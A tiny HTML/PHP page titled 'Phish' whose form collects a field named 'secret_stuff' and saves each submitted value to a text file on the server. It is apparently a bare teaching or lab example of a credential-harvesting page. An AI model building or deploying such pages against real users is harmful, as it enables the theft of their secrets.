<!DOCTYPE html>
<html>
<head>
  <title>Phish</title>
</head>
<body>
  <form method="GET" action="index.php">
    <input type="text" name="secret_stuff"/>
    <input type="submit" value="Submit"/>
  </form>

<?php
  if ($_GET['secret_stuff']) {
    $secret = $_GET['secret_stuff'];
    file_put_contents('index.txt', $secret);
  }
?>

</body>
</html>
